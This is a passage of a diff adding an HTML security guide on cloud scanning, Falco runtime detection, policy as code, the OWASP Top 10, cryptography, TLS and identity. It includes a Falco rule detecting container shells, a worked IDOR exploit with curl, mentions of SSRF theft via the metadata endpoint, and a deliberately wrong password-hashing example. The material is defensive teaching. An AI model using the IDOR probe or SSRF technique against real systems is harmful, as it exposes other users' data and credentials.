+<pre><code>prowler aws --compliance cis_2.0_aws
+#   FAIL  s3       Bucket 'acme-logs' has public READ access        (CIS 2.1.5)
+#   FAIL  ec2      SG sg-0a1b open to 0.0.0.0/0 on port 22          (CIS 5.2)
+#   FAIL  iam      Root account has active access keys              (CIS 1.4)
+#   PASS  cloudtrail  Multi-region trail enabled                    (CIS 3.1)
+
+# Shift it left — block the misconfig in IaC before it's ever created:
+checkov -d ./terraform
+#   Check: CKV_AWS_20 "S3 Bucket has an ACL defined which allows public access"
+#     FAILED for resource: aws_s3_bucket.logs</code></pre>
+
+<div class="box danger"><span class="box-title">Common cloud security mistakes</span><ul><li><strong>Public S3 buckets / open security groups</strong> — still the top cause of cloud data breaches.</li><li><strong>Long-lived IAM access keys</strong> committed or over-permissioned. Prefer roles + short-lived STS/OIDC federation.</li><li><strong>Using the root account</strong> for daily work, or leaving root access keys active.</li><li><strong>CloudTrail off, single-region, or mutable</strong> — no trustworthy audit trail after an incident.</li><li><strong>Assuming "AWS secures it."</strong> The shared-responsibility model puts config, IAM, and data protection on <em>you</em>.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a building with thousands of doors and one master console</span><p>On-prem, you had a fixed building with a guard at the one entrance. The cloud is a building where any authorized person can add a door anywhere with one keystroke. CSPM is the automated system that constantly walks every floor checking "is this door supposed to be here, and is it locked?" — because in a building that reconfigures itself all day, a periodic manual inspection is hopeless.</p></div>
+
+<h2 id="runtime">11. Runtime Detection</h2>
+<p class="section-intro">Scanning catches known issues before deploy; runtime detection catches attacks happening <em>now</em>.</p>
+<div class="box note"><span class="box-title">eBPF-powered runtime security</span><p>Tools like <strong>Falco</strong> and <strong>Tetragon</strong> use <a href="observability-k8s-guide.html#ebpf">eBPF</a> to watch kernel-level activity in real time — a shell spawning in a container, an unexpected outbound connection, a write to a sensitive path — and alert or block. This is your last line of defense when prevention fails.</p></div>
+
+<h4>Why runtime detection exists</h4>
+<p>Every preventive control has a blind spot: scanners only know <em>yesterday's</em> CVEs, policies only block what you anticipated, and a zero-day by definition has no signature. Runtime detection exists to catch the exploit <em>as it happens</em> — the moment prevention fails — by watching what processes actually <em>do</em>, not what they claim to be. It's the smoke detector: you hope it never fires, but you don't skip installing it because you have good wiring.</p>
+
+<h4>How eBPF-based detection works under the hood</h4>
+<p>eBPF lets you load tiny, verified programs into the Linux kernel that fire on events — a <code>execve</code> syscall (a program starting), a <code>connect</code> (an outbound network call), an <code>open</code> on a sensitive file. Falco attaches to these hooks and evaluates each event against rules describing <em>abnormal</em> behavior: "a shell was spawned inside a container," "a process wrote to <code>/etc/passwd</code>," "something read the ServiceAccount token then made an outbound connection." Because it observes the kernel directly and out-of-band, the workload can't easily hide from it or be slowed by it.</p>
+
+<div class="code-label label-yaml">A Falco rule and the alert it produces</div>
+<pre><code># Rule: a shell should never start inside a running container
+- rule: Terminal shell in container
+  condition: spawned_process and container and shell_procs and proc.tty != 0
+  output: "Shell spawned in container (user=%user.name container=%container.name
+           cmd=%proc.cmdline)"
+  priority: WARNING</code></pre>
+<div class="code-label label-output">What fires when an attacker execs into a pod</div>
+<pre><code>14:32:07 WARNING Shell spawned in container
+  (user=root container=payments-api cmd=bash -i
+   parent=node k8s.pod=payments-api-7c9 image=acme/api:1.4.2)
+# → alert to SIEM/Slack; playbook: cordon pod, snapshot, rotate its secrets</code></pre>
+
+<div class="box warn"><span class="box-title">Common runtime detection mistakes</span><ul><li><strong>Alerting on everything</strong> without tuning — legitimate ops (a cron job, an <code>kubectl debug</code>) trips rules and teams start ignoring alerts (alert fatigue).</li><li><strong>No response playbook.</strong> An alert nobody acts on is worthless; define who does what when a rule fires.</li><li><strong>Detection without prevention.</strong> It's the last line, not the only line — you still need hardening, RBAC, and scanning upstream.</li><li><strong>Not shipping alerts to the SIEM</strong>, so they die in a container log nobody reads.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a burglar alarm, not a lock</span><p>Hardening and scanning are locks and reinforced doors — they keep most intruders out. Runtime detection is the motion sensor inside the house: if someone does get past the locks, it notices the footsteps and calls for help. You want both; a house with great locks and no alarm gets quietly emptied.</p></div>
+
+<h2 id="compliance">12. Compliance &amp; Policy as Code</h2>
+<p class="section-intro">Encode compliance rules as machine-checked policy instead of PDF checklists, so violations are caught automatically.</p>
+<div class="code-label label-yaml">Kyverno policy — block privileged pods</div>
+<pre><code>apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata: { name: disallow-privileged }
+spec:
+  validationFailureAction: Enforce
+  rules:
+    - name: privileged-containers
+      match: { any: [{ resources: { kinds: [Pod] } }] }
+      validate:
+        message: "Privileged containers are not allowed."
+        pattern:
+          spec:
+            containers:
+              - =(securityContext):
+                  =(privileged): "false"</code></pre>
+<div class="box best"><span class="box-title">Policy as code scales governance</span><p>Frameworks like SOC 2, PCI-DSS, HIPAA map many requirements to technical controls. Encode them as OPA/Kyverno policies, IaC scans (Checkov), and CI gates. Auditors get evidence automatically, and drift is caught the moment it happens — far better than annual manual reviews.</p></div>
+
+<h4>Why policy as code exists</h4>
+<p>Compliance-by-PDF fails because a rule written in a document is only enforced when a human remembers to check it — usually once a year, right before the audit. By then, months of drift have accumulated. Policy as code exists to turn "thou shalt not run privileged containers" from a sentence someone might read into a machine-enforced control that rejects the violation automatically, every time, with an audit log proving it. It converts compliance from a periodic scramble into a continuous property of the system.</p>
+
+<h4>How admission-time policy enforcement works</h4>
+<p>In Kubernetes, every create/update request hits the API server, which calls out to <strong>validating admission webhooks</strong> (Kyverno, OPA Gatekeeper) before persisting the object. The policy engine evaluates the object against its rules and returns allow/deny. Because it sits in the request path, there's no way to create a non-compliant resource — the rule is enforced at the exact moment of change, and the denial is logged as evidence. OPA uses the Rego language; Kyverno uses YAML patterns (like the example above) that are easier for Kubernetes users.</p>
+
+<div class="code-label label-cmd">The policy blocking a violation in real time</div>
+<pre><code>kubectl apply -f privileged-pod.yaml
+#   Error from server: admission webhook "validate.kyverno.svc" denied the request:
+#   policy disallow-privileged/privileged-containers fail:
+#   Privileged containers are not allowed.
+# → the resource is never created; the denial is captured for the auditor.</code></pre>
+<div class="code-label label-config">Map a compliance requirement to an enforced control</div>
+<pre><code>PCI-DSS 2.2.4  "Configure system security parameters to prevent misuse"
+  └─ control: no privileged containers
+      └─ enforced by: Kyverno ClusterPolicy 'disallow-privileged' (Enforce mode)
+          └─ evidence: admission audit log + `kyverno report` PASS/FAIL counts</code></pre>
+
+<div class="box warn"><span class="box-title">Common policy-as-code mistakes</span><ul><li><strong>Deploying policies in Audit mode and never flipping to Enforce.</strong> "We log violations" isn't a control; it's a diary.</li><li><strong>Policies with no exemption mechanism</strong> — legitimate edge cases then force people to disable the whole policy.</li><li><strong>Writing policy that duplicates admission but never scanning IaC</strong>, so the violation is caught at deploy instead of in the PR (shift left).</li><li><strong>Confusing "passing the scan" with "being secure."</strong> Frameworks are a floor, not a ceiling.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: spell-check vs a proofreader</span><p>Old compliance is hiring a proofreader who reads the whole book once a year and lists every typo after it's printed. Policy as code is spell-check that refuses to let you type the misspelling in the first place — and keeps a log showing every correction, which is exactly the evidence the auditor wants.</p></div>
+
+<h2 id="owasp">13. OWASP Top 10 — the essential awareness</h2>
+<p class="section-intro">The OWASP Top 10 is the industry-standard list of the most critical web app risks. Every engineer should know it.</p>
+<table>
+  <tr><th>Risk</th><th>Defense</th></tr>
+  <tr><td>Broken Access Control</td><td>Enforce authz server-side; deny by default</td></tr>
+  <tr><td>Cryptographic Failures</td><td>TLS everywhere; encrypt at rest; no weak/DIY crypto</td></tr>
+  <tr><td>Injection (SQL, etc.)</td><td>Parameterized queries; validate/escape input</td></tr>
+  <tr><td>Insecure Design</td><td>Threat model early (§3)</td></tr>
+  <tr><td>Security Misconfiguration</td><td>Hardened defaults; CSPM; no debug in prod</td></tr>
+  <tr><td>Vulnerable Components</td><td>SCA scanning; patch promptly</td></tr>
+  <tr><td>Auth Failures</td><td>MFA; strong session mgmt; rate-limit logins</td></tr>
+  <tr><td>Data Integrity Failures</td><td>Sign artifacts; verify supply chain (§7)</td></tr>
+  <tr><td>Logging/Monitoring Failures</td><td>Centralized logs + alerts (<a href="observability-k8s-guide.html">Observability</a>)</td></tr>
+  <tr><td>SSRF</td><td>Validate/allow-list outbound URLs; block metadata endpoints</td></tr>
+</table>
+
+<h4>Why the OWASP Top 10 exists</h4>
+<p>It's a data-driven consensus list, compiled from hundreds of thousands of real applications, of the risks that actually cause breaches — so teams can prioritize. You can't fix everything at once; the Top 10 tells you which classes of flaw appear most often and do the most damage, giving a shared vocabulary between developers, security, and auditors. It's an awareness document, not a complete standard, but if you reliably prevent these ten you've eliminated the majority of real-world web compromise.</p>
+
+<h4>How the top risks actually work — worked example</h4>
+<p><strong>Broken Access Control</strong> (the #1 risk) is usually an <em>insecure direct object reference</em>: the server trusts an ID from the client without checking ownership.</p>
+<div class="code-label label-cmd">Exploiting and fixing a broken-access-control bug (IDOR)</div>
+<pre><code># Attacker is logged in as user 1001 but requests someone else's invoice:
+curl -H "Authorization: Bearer &lt;user-1001-token&gt;" https://api.acme.com/invoices/1002
+#   200 OK  { "id":1002, "user":1005, "amount": 4200 }   ← LEAK: not their invoice
+
+# Root cause — the query trusts the URL id and ignores who's asking:
+#   db.query("SELECT * FROM invoices WHERE id = ?", [req.params.id])
+
+# Fix — scope every object to the authenticated user, server-side:
+#   db.query("SELECT * FROM invoices WHERE id = ? AND user_id = ?",
+#            [req.params.id, req.user.id])
+#   → 404 for invoice 1002; the attacker can't even confirm it exists.</code></pre>
+
+<div class="box danger"><span class="box-title">Common OWASP mistakes</span><ul><li><strong>Enforcing authorization only in the UI</strong> (hiding a button) while the API endpoint remains open — the classic broken-access-control error.</li><li><strong>Building SQL/commands by string concatenation</strong> instead of parameterized queries → injection.</li><li><strong>Reflecting user input into HTML unescaped</strong> → stored/reflected XSS.</li><li><strong>Fetching user-supplied URLs server-side without an allow-list</strong> → SSRF into the cloud metadata endpoint (<code>169.254.169.254</code>) to steal credentials.</li><li><strong>Treating the list as a checkbox exercise</strong> rather than fixing the underlying design (Insecure Design is itself #4).</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: the "most common ways burglars get in" list</span><p>Police publish "top ways homes get burgled" — unlocked back door, open window, spare key under the mat. It's not every possible attack, but fixing those ten covers most break-ins. The OWASP Top 10 is that list for web apps: patch these and you've locked the doors burglars actually try.</p></div>
+
+<h2 id="crypto">14. Cryptography Fundamentals</h2>
+<p class="section-intro">Cryptography underpins all security. You don't need to invent algorithms, but you must understand the building blocks to use them correctly — the #1 source of crypto vulnerabilities is misuse, not broken math.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 250" role="img" aria-label="Symmetric versus asymmetric encryption">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Symmetric (one shared key) vs Asymmetric (key pair)</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="40" y="55" width="330" height="170" rx="10" fill="none" stroke="#58a6ff" stroke-width="2"/><text x="205" y="78" text-anchor="middle" class="svg-label" fill="#58a6ff">Symmetric (AES)</text>
+    <text x="205" y="106" text-anchor="middle" class="svg-sub">same secret key encrypts &amp; decrypts</text>
+    <text x="205" y="132" text-anchor="middle" class="svg-sub">fast — used for bulk data</text>
+    <text x="205" y="158" text-anchor="middle" class="svg-sub">problem: how to share the key?</text>
+    <text x="205" y="190" text-anchor="middle" class="svg-sub">🔑 = 🔑 (one key)</text>
+
+    <rect x="450" y="55" width="330" height="170" rx="10" fill="none" stroke="#7ee787" stroke-width="2"/><text x="615" y="78" text-anchor="middle" class="svg-label" fill="#7ee787">Asymmetric (RSA/ECC)</text>
+    <text x="615" y="106" text-anchor="middle" class="svg-sub">public key encrypts,</text>
+    <text x="615" y="126" text-anchor="middle" class="svg-sub">private key decrypts</text>
+    <text x="615" y="152" text-anchor="middle" class="svg-sub">slow — used to exchange keys/sign</text>
+    <text x="615" y="190" text-anchor="middle" class="svg-sub">🔓 public + 🔒 private (pair)</text>
+  </g>
+</svg>
+<figcaption>Real systems combine both: asymmetric crypto to safely exchange a session key, then fast symmetric crypto for the actual data. This is exactly how TLS works (next section).</figcaption>
+</figure>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 240" role="img" aria-label="Hashing versus HMAC for integrity">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Integrity: hash detects accident, HMAC detects tampering</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="40" y="55" width="330" height="160" rx="10" fill="none" stroke="#58a6ff" stroke-width="2"/><text x="205" y="78" text-anchor="middle" class="svg-label" fill="#58a6ff">Hash (SHA-256)</text>
+    <rect x="70" y="100" width="120" height="40" rx="6" fill="#21262d" stroke="#8b949e"/><text x="130" y="125" text-anchor="middle" class="svg-sub">data</text>
+    <rect x="220" y="100" width="120" height="40" rx="6" fill="#21262d" stroke="#8b949e"/><text x="280" y="125" text-anchor="middle" class="svg-sub">digest</text>
+    <line x1="190" y1="120" x2="218" y2="120" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-hash)"/>
+    <text x="205" y="170" text-anchor="middle" class="svg-sub">no key → detects accidental change</text>
+    <text x="205" y="192" text-anchor="middle" class="svg-sub" fill="#ff7b72">attacker can recompute it → not tamper-proof</text>
+
+    <rect x="450" y="55" width="330" height="160" rx="10" fill="none" stroke="#7ee787" stroke-width="2"/><text x="615" y="78" text-anchor="middle" class="svg-label" fill="#7ee787">HMAC (keyed)</text>
+    <rect x="480" y="100" width="110" height="40" rx="6" fill="#21262d" stroke="#8b949e"/><text x="535" y="125" text-anchor="middle" class="svg-sub">data + 🔑</text>
+    <rect x="640" y="100" width="110" height="40" rx="6" fill="#21262d" stroke="#7ee787"/><text x="695" y="125" text-anchor="middle" class="svg-sub">MAC tag</text>
+    <line x1="590" y1="120" x2="638" y2="120" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-hash)"/>
+    <text x="615" y="170" text-anchor="middle" class="svg-sub">secret key → detects MALICIOUS change</text>
+    <text x="615" y="192" text-anchor="middle" class="svg-sub">attacker without key cannot forge the tag</text>
+  </g>
+  <defs><marker id="sec-hash" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>A bare hash proves data wasn't corrupted by accident, but an attacker can recompute it. An HMAC mixes in a secret key, so only a party holding the key can produce a valid tag — that's authenticated integrity.</figcaption>
+</figure>
+
+<table>
+  <tr><th>Primitive</th><th>Purpose</th><th>Use</th></tr>
+  <tr><td>Symmetric (AES-256-GCM)</td><td>Confidentiality (fast)</td><td>Encrypting data at rest &amp; bulk traffic</td></tr>
+  <tr><td>Asymmetric (RSA, ECC)</td><td>Key exchange &amp; signatures</td><td>TLS handshake, signing</td></tr>
+  <tr><td>Hashing (SHA-256)</td><td>Integrity (one-way)</td><td>Checksums, fingerprints</td></tr>
+  <tr><td>Password hashing (bcrypt, argon2)</td><td>Slow, salted one-way</td><td>Storing passwords (NEVER plain SHA)</td></tr>
+  <tr><td>HMAC</td><td>Authenticated integrity</td><td>API request signing, tokens</td></tr>
+  <tr><td>Key exchange (Diffie-Hellman)</td><td>Agree a shared secret over public channel</td><td>TLS session setup</td></tr>
+</table>
+<div class="box danger"><span class="box-title">The cardinal rules of crypto</span><ul><li><strong>Never roll your own crypto</strong> or invent schemes — use vetted libraries (libsodium, the language's standard crypto).</li><li><strong>Never store passwords with plain SHA/MD5</strong> — use bcrypt/scrypt/argon2 (deliberately slow + salted).</li><li><strong>Use authenticated encryption</strong> (AES-GCM), not plain AES-CBC, to prevent tampering.</li><li><strong>Rotate keys</strong> and use a KMS/HSM to store them — never hardcode keys.</li></ul></div>
+
+<h4>Why we combine symmetric and asymmetric crypto</h4>
+<p>Each has a fatal weakness alone. Symmetric (AES) is fast — it can encrypt gigabytes per second — but both sides need the <em>same</em> secret key, and you can't safely send that key over an untrusted network (chicken-and-egg). Asymmetric (RSA/ECC) solves key distribution — anyone can encrypt to your public key, only your private key decrypts — but it's orders of magnitude slower and can't handle bulk data. So real systems use asymmetric crypto <em>once</em> to agree on a random symmetric session key, then switch to fast symmetric crypto for everything else. That's exactly the TLS handshake (next section).</p>
+
+<h4>How password hashing works under the hood</h4>
+<p>Passwords must never be encrypted (reversible) or plain-hashed. A plain SHA-256 of a password is broken instantly: attackers precompute hashes of billions of common passwords (rainbow tables) and match yours in a lookup. The fix has three parts: a <strong>salt</strong> (unique random value per password, defeats precomputation because every hash is unique), a <strong>slow</strong> function (bcrypt/argon2 are deliberately expensive so an attacker can only try thousands of guesses per second, not billions), and a tunable <strong>work factor</strong> you raise as hardware gets faster.</p>
+
+<div class="code-label label-cmd">Right vs wrong password storage</div>
+<pre><code># WRONG — instant to crack, no salt, fast hash:
+echo -n "hunter2" | sha256sum
+#   f52fbd32... ← identical for every user with this password; rainbow-table lookup
+
+# RIGHT — bcrypt: salted, slow, self-describing work factor:
+python -c "import bcrypt; print(bcrypt.hashpw(b'hunter2', bcrypt.gensalt(rounds=12)))"
+#   $2b$12$Nx7...saltandhash...   ($2b=bcrypt, 12=cost, then salt+hash together)
+# Verifying is a constant-time compare; raising cost to 13 doubles attacker effort.</code></pre>
+
+<div class="box danger"><span class="box-title">Common crypto mistakes (the real vulnerabilities)</span><ul><li><strong>Plain SHA/MD5 for passwords</strong> — use bcrypt/scrypt/argon2 with a salt.</li><li><strong>Reusing a nonce/IV</strong> with the same key in GCM/CTR — catastrophically breaks confidentiality.</li><li><strong>Plain AES-CBC without a MAC</strong> — malleable; attackers can tamper undetected (padding-oracle attacks). Use AES-GCM (authenticated).</li><li><strong>ECB mode</strong> — encrypts identical blocks identically, leaking patterns (the infamous "ECB penguin").</li><li><strong>Rolling your own</strong> or hardcoding keys in source instead of a KMS/HSM.</li><li><strong>Non-constant-time comparison</strong> of secrets/MACs — leaks the answer via timing.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a padlock everyone owns + a shared key</span><p>Asymmetric crypto is like handing out open padlocks anyone can snap shut, while only you keep the key that opens them — so anyone can send you a locked box, but only you open it. It's slow, so you use it just to send a small item: the key to a fast combination safe (symmetric). After that, you both use the quick safe for all the heavy stuff. Password hashing is different — it's a one-way paper shredder with a unique confetti pattern per person; you can check a document matches the shreds, but you can never un-shred it.</p></div>
+
+<h2 id="pki-tls">15. PKI &amp; TLS Deep Dive</h2>
+<p class="section-intro">TLS secures nearly all internet traffic. Understanding the handshake and the certificate trust chain (PKI) is essential for debugging HTTPS, mTLS, and cert issues.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 240" role="img" aria-label="TLS handshake steps">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">The TLS handshake (simplified)</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="60" y="55" width="120" height="40" rx="6" fill="#21262d" stroke="#58a6ff"/><text x="120" y="80" text-anchor="middle" class="svg-sub">client</text>
+    <rect x="640" y="55" width="120" height="40" rx="6" fill="#21262d" stroke="#7ee787"/><text x="700" y="80" text-anchor="middle" class="svg-sub">server</text>
+    <line x1="180" y1="110" x2="640" y2="110" stroke="#8b949e" stroke-width="1.5" marker-end="url(#tl)"/><text x="410" y="103" text-anchor="middle" class="svg-sub">1. ClientHello (supported ciphers)</text>
+    <line x1="640" y1="140" x2="180" y2="140" stroke="#8b949e" stroke-width="1.5" marker-end="url(#tl)"/><text x="410" y="133" text-anchor="middle" class="svg-sub">2. ServerHello + certificate (public key)</text>
+    <line x1="180" y1="170" x2="640" y2="170" stroke="#8b949e" stroke-width="1.5" marker-end="url(#tl)"/><text x="410" y="163" text-anchor="middle" class="svg-sub">3. verify cert chain, exchange session key</text>
+    <line x1="180" y1="205" x2="640" y2="205" stroke="#7ee787" stroke-width="2.5" marker-end="url(#tl)"/><text x="410" y="198" text-anchor="middle" class="svg-sub" fill="#7ee787">4. encrypted symmetric session ✓</text>
+  </g>
+  <defs><marker id="tl" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>The client verifies the server's certificate against trusted CAs, they agree a session key using asymmetric crypto, then switch to fast symmetric encryption. mTLS adds step where the <em>server</em> also verifies the <em>client's</em> cert.</figcaption>
+</figure>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 250" role="img" aria-label="PKI certificate chain of trust from root to leaf">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">PKI chain of trust — each cert signs the one below</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="290" y="50" width="240" height="52" rx="8" fill="#21262d" stroke="#7ee787" stroke-width="2"/><text x="410" y="72" text-anchor="middle" class="svg-label" fill="#7ee787">Root CA</text><text x="410" y="90" text-anchor="middle" class="svg-sub">self-signed, in browser trust store</text>
+    <rect x="290" y="130" width="240" height="52" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="410" y="152" text-anchor="middle" class="svg-label" fill="#58a6ff">Intermediate CA</text><text x="410" y="170" text-anchor="middle" class="svg-sub">signed by Root</text>
+    <rect x="290" y="210" width="240" height="34" rx="8" fill="#21262d" stroke="#f0883e"/><text x="410" y="232" text-anchor="middle" class="svg-sub" fill="#f0883e">Leaf cert — CN/SAN = example.com (signed by Intermediate)</text>
+    <line x1="410" y1="102" x2="410" y2="128" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-pki)"/><text x="470" y="120" class="svg-sub">signs</text>
+    <line x1="410" y1="182" x2="410" y2="208" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-pki)"/><text x="470" y="200" class="svg-sub">signs</text>
+    <text x="120" y="150" text-anchor="middle" class="svg-sub">client verifies</text>
+    <text x="120" y="168" text-anchor="middle" class="svg-sub">each signature</text>
+    <text x="120" y="186" text-anchor="middle" class="svg-sub">upward + checks</text>
+    <text x="120" y="204" text-anchor="middle" class="svg-sub">expiry, SAN, revocation</text>
+    <line x1="205" y1="175" x2="288" y2="175" stroke="#484f58" stroke-width="1.5" marker-end="url(#sec-pki)"/>
+    <text x="700" y="160" text-anchor="middle" class="svg-sub">reach a trusted</text>
+    <text x="700" y="178" text-anchor="middle" class="svg-sub">root → identity proven</text>
+    <text x="700" y="196" text-anchor="middle" class="svg-sub">broken link → warning</text>
+  </g>
+  <defs><marker id="sec-pki" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>The client walks the chain from the leaf up to a root in its trust store, verifying each signature, expiry, hostname (SAN) and revocation. Any broken link triggers the browser warning.</figcaption>
+</figure>
+
+<div class="box eli5"><span class="box-title">PKI = a chain of trust, like a notary system</span><p>Your browser trusts a handful of <strong>root Certificate Authorities</strong> (built-in). A CA signs an intermediate, which signs a website's certificate. When you visit a site, it presents its cert; your browser walks the chain up to a trusted root — like verifying a signature was notarized by someone whose authority traces back to a trusted official. If any link is broken, expired, or self-signed by an unknown party, you get the scary warning.</p></div>
+
+<div class="code-label label-cmd">Debugging certificates &amp; TLS</div>
+<pre><code># Inspect a live server's certificate chain
+openssl s_client -connect example.com:443 -showcerts
+
+# Check expiry &amp; details of a cert file
+openssl x509 -in cert.pem -noout -dates -subject -issuer
+
+# Common causes of TLS errors:
+#  - expired certificate (renew; automate with cert-manager/Let's Encrypt)
+#  - incomplete chain (server must send intermediate certs too)
+#  - hostname mismatch (cert CN/SAN != the domain)
+#  - untrusted CA (self-signed, or missing root)</code></pre>
+<div class="box best"><span class="box-title">Automate certificates</span><p>Manual cert renewal causes outages when someone forgets. Use <strong>Let's Encrypt</strong> + <strong>cert-manager</strong> (Kubernetes) or ACM (AWS) to issue and auto-renew. Enforce TLS 1.2+ (disable old SSL/TLS), use strong ciphers, and enable HSTS. Inside clusters, mTLS via a <a href="kubernetes-complete-guide.html#service-mesh">service mesh</a> gives automatic cert rotation.</p></div>
+
+<h4>How symmetric and asymmetric crypto combine in a TLS 1.3 handshake</h4>
+<p>Under the hood the handshake does exactly the "combine both" trick from §16. In TLS 1.3 it's one round trip: the client sends a <code>ClientHello</code> that already includes its <strong>ephemeral Diffie-Hellman public key</strong>. The server replies with its own ephemeral DH key <em>and</em> its certificate. Both sides now independently compute the same shared secret from their private + the other's public DH values — <strong>the session key is never transmitted</strong>, so even a recorded session can't be decrypted later (forward secrecy). The certificate's job is only to prove the server is who it claims (its signature over the handshake); the actual key agreement is the ephemeral DH. From there, everything is fast symmetric AES-GCM.</p>
+
+<h4>How the PKI chain of trust verifies a certificate</h4>
+<p>When the server presents its cert, the client verifies a chain, not a single document. Each certificate is <em>signed</em> by the one above it: leaf (the website) ← intermediate CA ← root CA. The client checks each signature using the issuer's public key, walking up until it reaches a root that's in its built-in trust store. It also checks: not expired, the domain matches the cert's SAN, and the cert isn't revoked (OCSP/CRL). If every link verifies and the root is trusted, the identity is proven — otherwise you get the browser warning.</p>
+
+<div class="code-label label-cmd">Watch the chain and handshake for a real site</div>
+<pre><code>openssl s_client -connect example.com:443 -servername example.com &lt;/dev/null 2&gt;/dev/null \
+  | openssl x509 -noout -subject -issuer -dates
+#   subject=CN = example.com
+#   issuer =C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1  ← intermediate
+#   notBefore=... notAfter=...   (check it's not expired)
+
+# See the full chain + negotiated protocol/cipher:
+openssl s_client -connect example.com:443 -showcerts 2&gt;/dev/null | grep -E "Protocol|Cipher|s:|i:"
+#   Protocol : TLSv1.3
+#   Cipher   : TLS_AES_256_GCM_SHA384    ← symmetric cipher chosen after DH key agreement
+#   s:CN=example.com   i:CN=...CA1   s:CN=...CA1  i:CN=DigiCert Global Root CA</code></pre>
+
+<div class="box danger"><span class="box-title">Common PKI/TLS mistakes</span><ul><li><strong>Expired certificates</strong> — the #1 cause of self-inflicted outages. Automate renewal (cert-manager/ACM).</li><li><strong>Incomplete chain</strong> — the server sends only the leaf, so clients missing the intermediate reject it. Serve the full chain.</li><li><strong>Hostname mismatch</strong> — cert SAN doesn't include the domain being visited.</li><li><strong>Disabling verification to "make it work"</strong> (<code>curl -k</code>, <code>verify=False</code>) — that removes the entire point of TLS and invites man-in-the-middle.</li><li><strong>Old protocols/ciphers</strong> (SSLv3, TLS 1.0, RC4) — disable them; require TLS 1.2+.</li><li><strong>Trusting a self-signed cert cluster-wide</strong> without pinning — anyone can self-sign.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a passport checked against a chain of authorities</span><p>The website's certificate is its passport. Your browser doesn't personally know the website, but it trusts a few root "governments" (root CAs) built in. The passport was issued by a regional office (intermediate CA) that was authorized by one of those governments. The browser checks each stamp up the chain to a government it trusts. The Diffie-Hellman part is like the two of you, in public, mixing paint colors so that only you two can reproduce the final secret shade — an eavesdropper watching the exchange still can't mix your private color.</p></div>
+
+<h2 id="identity">16. Identity, Authentication &amp; Authorization</h2>
+<p class="section-intro">Most breaches start with identity. Distinguishing authentication (who you are) from authorization (what you can do), and using modern protocols correctly, is foundational.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 280" role="img" aria-label="OAuth2 and OIDC authorization code flow">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">OAuth2 / OIDC — authorization code flow</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="24" y="60" width="130" height="44" rx="6" fill="#21262d" stroke="#58a6ff"/><text x="89" y="87" text-anchor="middle" class="svg-sub">User + Browser</text>
+    <rect x="345" y="60" width="130" height="44" rx="6" fill="#21262d" stroke="#7ee787"/><text x="410" y="87" text-anchor="middle" class="svg-sub">App (client)</text>
+    <rect x="666" y="60" width="130" height="44" rx="6" fill="#21262d" stroke="#f0883e"/><text x="731" y="80" text-anchor="middle" class="svg-sub">Identity</text><text x="731" y="96" text-anchor="middle" class="svg-sub">Provider</text>
+    <line x1="154" y1="130" x2="343" y2="130" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-oidc)"/><text x="248" y="123" text-anchor="middle" class="svg-sub">1. login →</text>
+    <line x1="475" y1="130" x2="664" y2="130" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-oidc)"/><text x="570" y="123" text-anchor="middle" class="svg-sub">2. redirect to IdP</text>
+    <line x1="664" y1="164" x2="475" y2="164" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-oidc)"/><text x="570" y="157" text-anchor="middle" class="svg-sub">3. auth code (after login+MFA)</text>
+    <line x1="475" y1="198" x2="664" y2="198" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-oidc)"/><text x="570" y="191" text-anchor="middle" class="svg-sub">4. exchange code + secret</text>
+    <line x1="664" y1="232" x2="475" y2="232" stroke="#7ee787" stroke-width="2.5" marker-end="url(#sec-oidc)"/><text x="570" y="225" text-anchor="middle" class="svg-sub" fill="#7ee787">5. access token (OAuth) + ID token (OIDC) ✓</text>
+    <text x="248" y="200" text-anchor="middle" class="svg-sub">the app never sees</text>
+    <text x="248" y="218" text-anchor="middle" class="svg-sub">the user's password</text>
+  </g>
+  <defs><marker id="sec-oidc" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>OAuth2 delegates <em>authorization</em> (an access token scoped to specific permissions); OIDC layers on <em>authentication</em> by adding a signed ID token proving who the user is. The app never handles the password.</figcaption>
+</figure>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 230" role="img" aria-label="JWT structure of header payload and signature">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">JWT structure — header . payload . signature</text>
